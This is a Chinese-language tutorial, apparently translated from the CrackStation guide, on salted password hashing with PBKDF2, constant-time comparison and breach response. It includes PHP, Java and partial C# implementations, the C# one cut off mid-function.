我们已经知道恶意黑客可以通过查表和彩虹表的方式快速的获得hash对应的明文密码，我们也知道了通过使用随机的盐可以解决这个问题。但是我们怎么生成盐，怎么在hash的过程中使用盐呢？

盐要使用密码学上可靠安全的伪随机数生成器(Cryptographically Secure Pseudo-Random Number Generator (CSPRNG))来产生。CSPRNG跟普通的伪随机数生成器比如C语言中的rand(),有很大不同。正如它的名字说明的那样，CSPRNG提供一个高标准的随机数，是完全无法预测的。我们不希望我们的盐能够被预测到，所以一定要使用CSPRNG。下表提供了一些常用语言中的CSPRNG。

Platform	CSPRNG
PHP	mcrypt_create_iv, openssl_random_pseudo_bytes
Java	java.security.SecureRandom
Dot NET (C#, VB)	System.Security.Cryptography.RNGCryptoServiceProvider
Ruby	SecureRandom
Python	os.urandom
Perl	Math::Random::Secure
C/C++ (Windows API)	CryptGenRandom
Any language on GNU/Linux or Unix	Read from /dev/random or /dev/urandom
每一个用户，每一个密码都要使用不同的盐。用户每次创建账户或者修改密码都要使用一个新的随机盐。永远不要重复使用盐。盐的长度要足够，一个经验规则就是盐的至少要跟hash函数输出的长度一致。盐应该跟hash一起存储在用户信息表里。

存储一个密码：

1, 使用CSPRNG生成一个长的随机盐。 

2, 将密码和盐拼接在一起，使用标准的加密hash函数比如SHA256进行hash 

3, 将盐和hash记录在用户数据库中

验证一个密码：

1, 从数据库中取出用户的盐和hash 

2, 将用户输入的密码和盐按相同方式拼接在一起，使用相同的hash函数进行hash 

3, 比较计算出的hash跟存储的hash是否相同。如果相同则密码正确。反之则密码错误。

在本文的最后，给出了php,C#,Java,Ruby的加盐密码hash的实现代码。

在web应用中，要在服务端进行hash：

如果你在写一个web应用，可能会有在客户端还是服务端进行hash的疑惑。是将密码在浏览器里使用javascript进行hash，还是将明文传给服务端，在服务端进行hash呢？

即使在客户端用javascript进行了hash，在服务端依然需要将得到的密码hash再进行hash。如果不这么做的话，认证用户的时候，服务端是获取了浏览器传过来的hash跟数据库里的hash比较。这样子看起来是更安全了，因为没有明文密码传送到服务端。但是事实上却不是这样。

问题在于这样的话，如果恶意的黑客获取了用户的hash，就可以直接用来登陆用户的账号了。甚至都不需要知道用户的明文密码！也就不需要破解hash了。

这并不是说你完全不能在浏览器端进行hash。只是如果你要这样做的话，一定要在服务端再hash一次。在浏览器端进行hash是一个不错的想法，但是在实现的时候一定要考虑到以下几点：

1, 客户端密码hash并不是HTTPS(SSL/TLS)的替代品。如果浏览器和服务器之间的连接是不安全的，中间人(man-in-the-middle)可能通过修改网页的加载的javascript移除掉hash函数来得到用户的明文密码。

2, 有些浏览器可能不支持javascript，有些用户也会禁用javascript。为了更好的兼容性，需要检测用户的浏览器是否支持javascript，如果不支持的话就需要在服务端模拟客户端hash的逻辑。

3, 客户端的hash也需要加盐。一个很容想到的方式就是使用客户端脚本请求服务器或得用户的盐。记住，不要使用这种方式。因为这样恶意攻击者就可以通过这个逻辑来判断一个用户名是否有效。因为我们已经在服务端进行了恰当的加盐的hash。所以这里使用用户名跟特定的字符串(比如域名)拼接作为客户端的盐是可以的。

使用慢速hash函数让破解更加困难:

加盐可以让攻击者无法使用查表和彩虹表的方式对大量hash进行破解。但是依然无法避免对单个hash的字典和暴力攻击。高端的显卡(GPUs)和一些定制的硬件每秒可以计算数十亿的hash，所以针对单个hash的攻击依然有效。为了避免字典和暴力攻击，我们可以采用一种称为key扩展(key stretching)的技术。

思路就是让hash的过程便得非常缓慢，即使使用高速GPU和特定的硬件，字典和暴力破解的速度也慢到没有实用价值。通过减慢hash的过程来防御攻击，但是hash速度依然可以保证用户使用的时候没有明显的延迟。

key扩展的实现是使用一种大量消耗cpu资源的hash函数。不要去使用自己创造的迭代hash函数，那是不够的。要使用标准算法的hash函数，比如PBKDF2或者bcrypt。PHP实现可以在这里找到。

这些算法采用了一个安全变量或者迭代次数作为参数。这个值决定了hash的过程具体有多慢。对于桌面软件和手机APP，确定这个参数的最好方式是在设备上运行一个标准测试程序得到hash时间大概在半秒左右的值。这样就可以避免暴力攻击，也不会影响用户体验。

如果是在web应用中使用key扩展hash函数，需要考虑可能有大量的计算资源用来处理用户认证请求。攻击者可能通过这种方式来进行拒绝服务攻击。不过我依然推荐使用key扩展hash函数，只是迭代次数设置的小一点。这个次数需要根据自己服务器的计算能力和预计每秒需要处理的认证请求次数来设置。对于拒绝服务攻击可以通过让用户登陆的时候输入验证码的方式来防御。系统设计的时候一定要考虑到这个迭代次数将来可以方便的增加或降低。

如果你担心计算机的能力不够强，而又希望在自己的web应用中使用key扩展hash函数，可以考虑在用户的浏览器运行hash函数。Stanford JavaScript Crypto Library包含了PBKDF2算法。在浏览器中进行hash需要考虑上面提到的几个方面。

理论上不可能破解的hash：使用加密的key和密码hash硬件

只要攻击者能够验证一个猜测的密码是正确还是错误，他们都可以使用字典或者暴力攻击破解hash。更深度的防御方法是加入一个保密的key(secret key)进行hash，这样只有知道这个key的人才能验证密码是否正确。这个可以通过两种方式来实现。一种是hash通过加密算法加密比如AES，或者使用基于key的hash函数(HMAC)。

这个实现起来并不容易。key一定要做到保密，即使系统被攻破也不能泄露才行。但是如果攻击者获取了系统权限，无论key保存在哪里，都可能被获取到。所以这个key一定要保存在一个外部系统中，比如专门用来进行密码验证的物理隔离的服务器。或是使用安装在服务器上特殊硬件，比如YubiHSM。

强烈建议所有大型的服务(超过10万用户)的公司使用这种方式。对于超过100万用户的服务商一定得采用这种方式保护用户信息。

如果条件不允许使用专用验证的服务器和特殊的硬件，依然从这种方式中受益。大部分数据库泄露都是利用了SQL注入技术。sql注入大部分情况下，攻击者都没法读取服务器上的任意文件(关闭数据库服务器的文件权限)。如果你生成了一个随机的key，把它保存在了一个文件里。并且密码使用了加密key的加盐hash，单单sql注入攻击导致的hash泄露并不会影响用户的密码。虽然这种方式不如使用独立的系统来保存key安全，因为如果系统存在文件包含漏洞的话，攻击者就可能读取这个秘密文件了。不过，使用了加密key总归好过没有使用吧。

需要注意使用key的hash并不是不需要加盐，聪明的攻击者总是会找到办法获取到key的。所以让hash在盐和key扩展的保护下非常重要。

其他的安全措施
密码hash仅仅是在发生安全事故的时候保护密码。它并不能让应用程序更加安全。对于保护用户密码hash更多的是需要保护密码hash不被偷走。

即使经验丰富的程序也需要经过安全培训才能写出安全的应用。一个不错的学习web应用漏洞的资源是OWASP。除非你理解了OWASP Top Ten Vulnerability List,否则不要去写关系到敏感数据的程序。公司有责任确保所有的开发者都经过了足够的安全开发的培训。

通过第三方的渗透测试也是不错的方式。即使最好的程序员也会犯错，所以让安全专家来审计代码总是有意义的。寻找一个可信赖的第三方或者自己招聘一个安全人员来机型定期的代码审计。安全评审要在应用生命周期的早期就开始并且贯穿整个开发过程。

对网站进行入侵监控也十分重要。我建议至少招聘一名全职的安全人员进行入侵检测和安全事件响应。如果入侵没有检测到，攻击者可能让在你的网站上挂马影响你的用户。所以迅速的入侵检测和响应也很重要。

经常提问的问题
我应该使用什么hash算法

可以使用

1, 本文最后介绍的代码 

2, OpenWall的Portable PHP password hashing framework 

3, 经过充分测试的加密hash函数，比如SHA256, SHA512, RipeMD, WHIRLPOOL, SHA3等 

4, 设计良好的key扩展hash算法，比如PBKDF2，bcrypt，scrypt 

5, crypt#Library_Function_crypt.283.29)的安全版本。($2y$, $5$, $6$)

不要使用

1, 过时的hash函数，比如MD5,SHA1 

2， crypt的不安全版本。($1$, $2$, $2x$, $3$) 

3, 任何自己设计的算法。

尽管MD5和SHA1并没有密码学方面的攻击导致它们生成的hash很容易被破解，但是它们年代很古老了，通常都认为(可能有一些不恰当)它们不合适用来进行密码的存储。所以我不推荐使用它们。对于这个规则有个例外就是PBKDF2,它使用SHA1作为它的基础算法。

当用户忘记密码的时候我应该怎样让他们重置

在我个人看来现在外面广泛使用的密码重置机制都是不安全的，如果你有很高的安全需求，比如重要的加密服务，那么不要让用户重置他们的密码。

大多数网站使用绑定的email来进行密码找回。通过生成一个随机的只使用一次的token，这个token必须跟账户绑定，然后把密码重置的链接发送到用户邮箱中。当用户点击密码重置链接的时候，提示他们输入新的密码。需要注意token一定要绑定到用户以免攻击者使用发送给自己的token来修改别人的密码。

token一定要设置成15分钟后或者使用一次后作废。当用户登陆或者请求了一个新的token的时候，之前发送的token都作废也是不错的主意。如果token不失效的话，那么就可以用来永久控制这个账户了。Email(SMTP)是明文传输的协议，而互联网上可能有很多恶意的路由器记录email流量。并且用户的email账号也可能被盗。使token尽可能快的失效可以降低上面提到的这些风险。

用户可能尝试去修改token，所以不要在token里存储任何账户信息。token应该是一个不能被预测的随机的二进制块(binary blob)，仅仅用来进行识别的一条记录。

永远不要通过email发送用户的新密码。记得用户重置密码的时候要重新生成盐，不要使用之前旧密码使用的盐。

如果我的用户数据库泄露了，我应该怎么办

第一要做的就是弄明白信息是怎么泄露的，然后把漏洞修补好。

人们可能会想办法掩盖这次安全事件，希望没有人知道。但是，尝试掩盖安全事件会让你的处境变得更糟。因为你不告知你的用户他的信息和密码可能泄露了会给用户带来更大的风险。一定要第一时间通知用户发生了安全事件，即使你还没有完全搞明白黑客到底渗透到了什么程度。在首页上放一个提醒，然后链接到详细说明的页面。如果可能的话给每一个用户发送email提醒。

向你的用户详细的说明他的密码是如何被保护的，希望是加盐的hash，即使密码进行了加盐hash保护，攻击者依然会进行字典和暴力攻击尝试破解hash。攻击者会使用发现的密码尝试登陆其他网站，因为用户可能在不同的网站都使用了相同的密码(所谓的撞库攻击)。告知你的用户存在的这些风险，建议他们修改使用了相同密码的地方。在自己的网站上，下次用户登陆的时候强制他们修改密码。大部分用户可能会尝试使用相同的密码，为了方便。要设计足够的逻辑避免这样的情况发生。

即使有了加盐的hash，攻击者也可能快速破解一些很弱的弱密码。为了降低这种风险，可以在使用正确密码的前提下，加一个邮件认证，直到用户修改密码。

还要告知你的用户有哪些个人信息存储在网站上。如果数据库包含信用卡信息，你需要通知你的用户注意自己近期的账单，并且最好注销掉这个信用卡。

应该使用怎样的密码策略，需要强制使用强密码么

如果你的服务不是有很严格的安全需求，那么不要限制你的用户。我建议在用户输入密码的时候显示它的强度等级。让用户自己决定使用什么强度的密码。如果你的系统有很强的安全需求，那么强制用户使用12位以上的密码，至少包含2个数字，2个字母，2个字符。

每6个月最多强制用户修改一次密码。超过这个次数，用户就会感到疲劳。他们更倾向于选择一个弱密码。更应该做的是教育你的用户，当他们感到自己的密码可能泄露的时候主动修改密码。

如果攻击者获取了数据库权限，他不能直接替换hash登陆任意账户么

当然，不过如果他已经或得了数据库权限，很可能已经可以获得服务器上的所有信息了。所以没有什么必要去修改hash登陆别人账户。进行密码hash的目的不是保护网站不被入侵，而是如果入侵发生了，可以更好的保护用户的密码。

在SQL注入攻击中，保护hash不被替换的方式使用两个用户不同权限的用户连接数据库。一个具有写权限，另外一个只具有只读的权限。

为什么需要一些特别的算法比如HMAC，而不是直接把密码和加密key拼接在一起

(这部分讲一些密码学的原理，翻译的不好请见谅)

hash函数，比如MD5,SHA1,SHA2使用了Merkle–Damgård construction，这导致算法可能长度扩展攻击(length extension attacks)。意思就是说给定一个hash H(X)，攻击者可以在不知道X的情况下，可以找到一个H(pad(X)+Y)的值，Y是个其他的字符串。pad(X)是hash函数使用的填充函数(padding function)。

这就意味者，对于hash H(key + message)，攻击者可以计算 H(pad(key + message) + extension)，并不需要知道加密key。如果这个hash是用在消息认证过程中，使用key为了避免消息被修改。这样的话这个系统就可能失效了，因为攻击者掌握了一个有效的基于 message+extension的hash。

这种攻击对于如何快速破解hash还不是很清楚。但是，基于一些风险的考虑，不建议使用单纯的hash函数进行加密key的hash。也许一个聪明的密码学家一天就可以找到使用这种攻击快速破解hash的方法。所以记得使用HMAC。

盐应该拼在密码的前面还是后面

这个不重要。选择一个并且保持风格一致就行了。实际中，把盐放在前面更常见一点。

为什么本文最后提供的hash代码使用了固定执行时间的函数来比较hash(length-constant)

使用固定的时间来比较hash是为了防止攻击者在线上的系统中使用基于时间差的攻击。这样攻击者就只能线下破解了。

比较两个字符串是否相同，标准的方式是先比较第一个字节，然后比较第二个字节，一次类推。只要发现有一个字节不同，那么这两个字符串就是不同了。可以返回false的消息了。如果所有字节比较下来都一样，那么这两个字符串就是相同的，可以返回true。这就意味了比较两个字符串，如果他们相同的长度不一样，花费的时间不一样。开始部分相同的长度越长，花费的时间也就越长。

基于这个原理，攻击者可以先找256个字符串，他们的hash都是以不同的字节开头。然后发送到目标服务器，计算服务器返回的时间。时间最长的那一个就是第一个字节hash是正确的。依次类推。攻击者就可能得到hash更多的字节。

这种攻击听起来好像在网络上实现起来比较困难。但是已经有人实现过了。所以我们在比较hash的时候采用了花费时间固定的函数。

本文提供的代码中 slowequals 函数是怎么工作的

上一回答讲到了我们需要比较时间固定的函数，这部分详细讲一下代码的实现。

1.     private static boolean slowEquals(byte[] a, byte[] b)
2.     {
3.         int diff = a.length ^ b.length;
4.         for(int i = 0; i < a.length && i < b.length; i++)
5.             diff |= a[i] ^ b[i];
6.         return diff == 0;
7.     }
这段代码使用了异或(XOR)操作符”^”来比较整数是否相等，而没有使用”==”操作符。原因在于如果两个数完全一致，异或之后的值为零。因为 0 XOR 0 = 0, 1 XOR 1 = 0, 0 XOR 1 = 1, 1 XOR 0 = 1。

所以，第一行代码如果a.length等于b.length，变量diff等于0,否则的话diff就是一个非零的值。然后，让a，b的每一个字节XOR之后再跟diff OR。这样，只有diff一开始是0,并且，a，b的每一个字节XOR的结果也是零，最后循环完成后diff的值才是0,这种情况是a，b完全一样。否则最后diff是一个非零的值。

我们使用XOR而不适用”==”的原因是”==”通常编译成分支的形式。比如C代码”diff &= a == b” 可能编译成下面的X86汇编。

MOV EAX, [A]
CMP [B], EAX
JZ equal
JMP done
equal:
AND [VALID], 1
done:
AND [VALID], 0
分支会导致代码执行的时间出现差异。

C代码的”diff |= a ^ b”编译之后类似于，

MOV EAX, [A]
XOR EAX, [B]
OR [DIFF], EAX
执行时间跟两个变量是否相等没有关系。

为什么要讨论这么多关于hash的东西

用户在你的网站上输入密码，是相信你的安全性。如果你的数据库被黑了。而用户密码又没有恰当的保护，那么恶意的攻击者就可以利用这些密码尝试登陆其他的网站和服务。进行撞库攻击。(很多用户在所有的地方都是使用相同的密码)这不仅仅是你的网站安全，是你的所有用户的安全。你要对你用户的安全负责。

PHP PBKDF2 密码hash代码
代码下载

<?php
/*
 * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
 * Copyright (c) 2013, Taylor Hornby
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without 
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, 
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation 
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
 * POSSIBILITY OF SUCH DAMAGE.
 */// These constants may be changed without breaking existing hashes.
define("PBKDF2_HASH_ALGORITHM", "sha256");
define("PBKDF2_ITERATIONS", 1000);
define("PBKDF2_SALT_BYTE_SIZE", 24);
define("PBKDF2_HASH_BYTE_SIZE", 24);
define("HASH_SECTIONS", 4);
define("HASH_ALGORITHM_INDEX", 0);
define("HASH_ITERATION_INDEX", 1);
define("HASH_SALT_INDEX", 2);
define("HASH_PBKDF2_INDEX", 3);function create_hash($password){
    // format: algorithm:iterations:salt:hash
    $salt = base64_encode(mcrypt_create_iv(PBKDF2_SALT_BYTE_SIZE, MCRYPT_DEV_URANDOM));
    return PBKDF2_HASH_ALGORITHM . ":" . PBKDF2_ITERATIONS . ":" .  $salt . ":" .
        base64_encode(pbkdf2(
            PBKDF2_HASH_ALGORITHM,
            $password,
            $salt,
            PBKDF2_ITERATIONS,
            PBKDF2_HASH_BYTE_SIZE,
            true
        ));}function validate_password($password, $correct_hash){
    $params = explode(":", $correct_hash);
    if(count($params) < HASH_SECTIONS)
       return false;
    $pbkdf2 = base64_decode($params[HASH_PBKDF2_INDEX]);
    return slow_equals(
        $pbkdf2,
        pbkdf2(
            $params[HASH_ALGORITHM_INDEX],
            $password,
            $params[HASH_SALT_INDEX],
            (int)$params[HASH_ITERATION_INDEX],
            strlen($pbkdf2),
            true
        )
    );}// Compares two strings $a and $b in length-constant time.function slow_equals($a, $b){
    $diff = strlen($a) ^ strlen($b);
    for($i = 0; $i < strlen($a) && $i < strlen($b); $i++)
    {
        $diff |= ord($a[$i]) ^ ord($b[$i]);
    }
    return $diff === 0;}/*
 * PBKDF2 key derivation function as defined by RSA's PKCS #5: https://www.ietf.org/rfc/rfc2898.txt
 * $algorithm - The hash algorithm to use. Recommended: SHA256
 * $password - The password.
 * $salt - A salt that is unique to the password.
 * $count - Iteration count. Higher is better, but slower. Recommended: At least 1000.
 * $key_length - The length of the derived key in bytes.
 * $raw_output - If true, the key is returned in raw binary format. Hex encoded otherwise.
 * Returns: A $key_length-byte key derived from the password and salt.
 *
 * Test vectors can be found here: https://www.ietf.org/rfc/rfc6070.txt
 *
 * This implementation of PBKDF2 was originally created by https://defuse.ca
 * With improvements by http://www.variations-of-shadow.com
 */function pbkdf2($algorithm, $password, $salt, $count, $key_length, $raw_output = false){
    $algorithm = strtolower($algorithm);
    if(!in_array($algorithm, hash_algos(), true))
        trigger_error('PBKDF2 ERROR: Invalid hash algorithm.', E_USER_ERROR);
    if($count <= 0 || $key_length <= 0)
        trigger_error('PBKDF2 ERROR: Invalid parameters.', E_USER_ERROR);
    if (function_exists("hash_pbkdf2")) {
        // The output length is in NIBBLES (4-bits) if $raw_output is false!
        if (!$raw_output) {
            $key_length = $key_length * 2;
        }
        return hash_pbkdf2($algorithm, $password, $salt, $count, $key_length, $raw_output);
    }
    $hash_length = strlen(hash($algorithm, "", true));
    $block_count = ceil($key_length / $hash_length);
    $output = "";
    for($i = 1; $i <= $block_count; $i++) {
        // $i encoded as 4 bytes, big endian.
        $last = $salt . pack("N", $i);
        // first iteration
        $last = $xorsum = hash_hmac($algorithm, $last, $password, true);
        // perform the other $count - 1 iterations
        for ($j = 1; $j < $count; $j++) {
            $xorsum ^= ($last = hash_hmac($algorithm, $last, $password, true));
        }
        $output .= $xorsum;
    }
    if($raw_output)
        return substr($output, 0, $key_length);
    else
        return bin2hex(substr($output, 0, $key_length));}?>
java PBKDF2 密码hash代码
代码下载

/* 
 * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
 * Copyright (c) 2013, Taylor Hornby
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without 
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, 
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation 
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
 * POSSIBILITY OF SUCH DAMAGE.
 */

import java.security.SecureRandom;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.SecretKeyFactory;
import java.math.BigInteger;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;

/*
 * PBKDF2 salted password hashing.
 * Author: havoc AT defuse.ca
 * www: http://crackstation.net/hashing-security.htm
 */
public class PasswordHash
{
    public static final String PBKDF2_ALGORITHM = "PBKDF2WithHmacSHA1";

    // The following constants may be changed without breaking existing hashes.
    public static final int SALT_BYTE_SIZE = 24;
    public static final int HASH_BYTE_SIZE = 24;
    public static final int PBKDF2_ITERATIONS = 1000;

    public static final int ITERATION_INDEX = 0;
    public static final int SALT_INDEX = 1;
    public static final int PBKDF2_INDEX = 2;

    /**
     * Returns a salted PBKDF2 hash of the password.
     *
     * @param   password    the password to hash
     * @return              a salted PBKDF2 hash of the password
     */
    public static String createHash(String password)
        throws NoSuchAlgorithmException, InvalidKeySpecException
    {
        return createHash(password.toCharArray());
    }

    /**
     * Returns a salted PBKDF2 hash of the password.
     *
     * @param   password    the password to hash
     * @return              a salted PBKDF2 hash of the password
     */
    public static String createHash(char[] password)
        throws NoSuchAlgorithmException, InvalidKeySpecException
    {
        // Generate a random salt
        SecureRandom random = new SecureRandom();
        byte[] salt = new byte[SALT_BYTE_SIZE];
        random.nextBytes(salt);

        // Hash the password
        byte[] hash = pbkdf2(password, salt, PBKDF2_ITERATIONS, HASH_BYTE_SIZE);
        // format iterations:salt:hash
        return PBKDF2_ITERATIONS + ":" + toHex(salt) + ":" +  toHex(hash);
    }

    /**
     * Validates a password using a hash.
     *
     * @param   password        the password to check
     * @param   correctHash     the hash of the valid password
     * @return                  true if the password is correct, false if not
     */
    public static boolean validatePassword(String password, String correctHash)
        throws NoSuchAlgorithmException, InvalidKeySpecException
    {
        return validatePassword(password.toCharArray(), correctHash);
    }

    /**
     * Validates a password using a hash.
     *
     * @param   password        the password to check
     * @param   correctHash     the hash of the valid password
     * @return                  true if the password is correct, false if not
     */
    public static boolean validatePassword(char[] password, String correctHash)
        throws NoSuchAlgorithmException, InvalidKeySpecException
    {
        // Decode the hash into its parameters
        String[] params = correctHash.split(":");
        int iterations = Integer.parseInt(params[ITERATION_INDEX]);
        byte[] salt = fromHex(params[SALT_INDEX]);
        byte[] hash = fromHex(params[PBKDF2_INDEX]);
        // Compute the hash of the provided password, using the same salt, 
        // iteration count, and hash length
        byte[] testHash = pbkdf2(password, salt, iterations, hash.length);
        // Compare the hashes in constant time. The password is correct if
        // both hashes match.
        return slowEquals(hash, testHash);
    }

    /**
     * Compares two byte arrays in length-constant time. This comparison method
     * is used so that password hashes cannot be extracted from an on-line 
     * system using a timing attack and then attacked off-line.
     * 
     * @param   a       the first byte array
     * @param   b       the second byte array 
     * @return          true if both byte arrays are the same, false if not
     */
    private static boolean slowEquals(byte[] a, byte[] b)
    {
        int diff = a.length ^ b.length;
        for(int i = 0; i < a.length && i < b.length; i++)
            diff |= a[i] ^ b[i];
        return diff == 0;
    }

    /**
     *  Computes the PBKDF2 hash of a password.
     *
     * @param   password    the password to hash.
     * @param   salt        the salt
     * @param   iterations  the iteration count (slowness factor)
     * @param   bytes       the length of the hash to compute in bytes
     * @return              the PBDKF2 hash of the password
     */
    private static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int bytes)
        throws NoSuchAlgorithmException, InvalidKeySpecException
    {
        PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, bytes * 8);
        SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM);
        return skf.generateSecret(spec).getEncoded();
    }

    /**
     * Converts a string of hexadecimal characters into a byte array.
     *
     * @param   hex         the hex string
     * @return              the hex string decoded into a byte array
     */
    private static byte[] fromHex(String hex)
    {
        byte[] binary = new byte[hex.length() / 2];
        for(int i = 0; i < binary.length; i++)
        {
            binary[i] = (byte)Integer.parseInt(hex.substring(2*i, 2*i+2), 16);
        }
        return binary;
    }

    /**
     * Converts a byte array into a hexadecimal string.
     *
     * @param   array       the byte array to convert
     * @return              a length*2 character string encoding the byte array
     */
    private static String toHex(byte[] array)
    {
        BigInteger bi = new BigInteger(1, array);
        String hex = bi.toString(16);
        int paddingLength = (array.length * 2) - hex.length();
        if(paddingLength > 0)
            return String.format("%0" + paddingLength + "d", 0) + hex;
        else
            return hex;
    }

    /**
     * Tests the basic functionality of the PasswordHash class
     *
     * @param   args        ignored
     */
    public static void main(String[] args)
    {
        try
        {
            // Print out 10 hashes
            for(int i = 0; i < 10; i++)
                System.out.println(PasswordHash.createHash("p\r\nassw0Rd!"));

            // Test password validation
            boolean failure = false;
            System.out.println("Running tests...");
            for(int i = 0; i < 100; i++)
            {
                String password = ""+i;
                String hash = createHash(password);
                String secondHash = createHash(password);
                if(hash.equals(secondHash)) {
                    System.out.println("FAILURE: TWO HASHES ARE EQUAL!");
                    failure = true;
                }
                String wrongPassword = ""+(i+1);
                if(validatePassword(wrongPassword, hash)) {
                    System.out.println("FAILURE: WRONG PASSWORD ACCEPTED!");
                    failure = true;
                }
                if(!validatePassword(password, hash)) {
                    System.out.println("FAILURE: GOOD PASSWORD NOT ACCEPTED!");
                    failure = true;
                }
            }
            if(failure)
                System.out.println("TESTS FAILED!");
            else
                System.out.println("TESTS PASSED!");
        }
        catch(Exception ex)
        {
            System.out.println("ERROR: " + ex);
        }
    }

}
ASP.NET (C#)密码hash代码
代码下载

/* 
 * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
 * Copyright (c) 2013, Taylor Hornby
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without 
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, 
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation 
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
 * POSSIBILITY OF SUCH DAMAGE.
 */

using System;
using System.Text;
using System.Security.Cryptography;

namespace PasswordHash
{
    /// <summary>
    /// Salted password hashing with PBKDF2-SHA1.
    /// Author: havoc AT defuse.ca
    /// www: http://crackstation.net/hashing-security.htm
    /// Compatibility: .NET 3.0 and later.
    /// </summary>
    public class PasswordHash
    {
        // The following constants may be changed without breaking existing hashes.
        public const int SALT_BYTE_SIZE = 24;
        public const int HASH_BYTE_SIZE = 24;
        public const int PBKDF2_ITERATIONS = 1000;

        public const int ITERATION_INDEX = 0;
        public const int SALT_INDEX = 1;
        public const int PBKDF2_INDEX = 2;

        /// <summary>
        /// Creates a salted PBKDF2 hash of the password.
        /// </summary>
        /// <param name="password">The password to hash.</param>
        /// <returns>The hash of the password.</returns>
        public static string CreateHash(string password)
        {
            // Generate a random salt
            RNGCryptoServiceProvider csprng = new RNGCryptoServiceProvider();
            byte[] salt = new byte[SALT_BYTE_SIZE];
            csprng.GetBytes(salt);

            // Hash the password and encode the parameters
            byte[] hash = PBKDF2(password, salt, PBKDF2_ITERATIONS, HASH_BYTE_SIZE);
            return PBKDF2_ITERATIONS + ":" +
                Convert.ToBase64String(salt) + ":" +
                Convert.ToBase64String(hash);
        }

        /// <summary>
        /// Validates a password given a hash of the correct one.
        /// </summary>
        /// <param name="password">The password to check.</param>
        /// <param name="correctHash">A hash of the correct password.</param>
        /// <returns>True if the password is correct. False otherwise.</returns>
        public static bool ValidatePassword(string password, string correctHash)
        {
            // Extract the parameters from the hash
            char[] delimiter = { ':' };
            string[] split = correctHash.Split(delimiter);
            int iterations = Int32.Parse(split[ITERATION_INDEX]);
            byte[] salt = Convert.FromBase64String(split[SALT_INDEX]);
            byte[] hash = Convert.FromBase64String(split[PBKDF2_INDEX]);

            byte[] testHash = PBKDF2(password, salt, iterations, hash.Length);
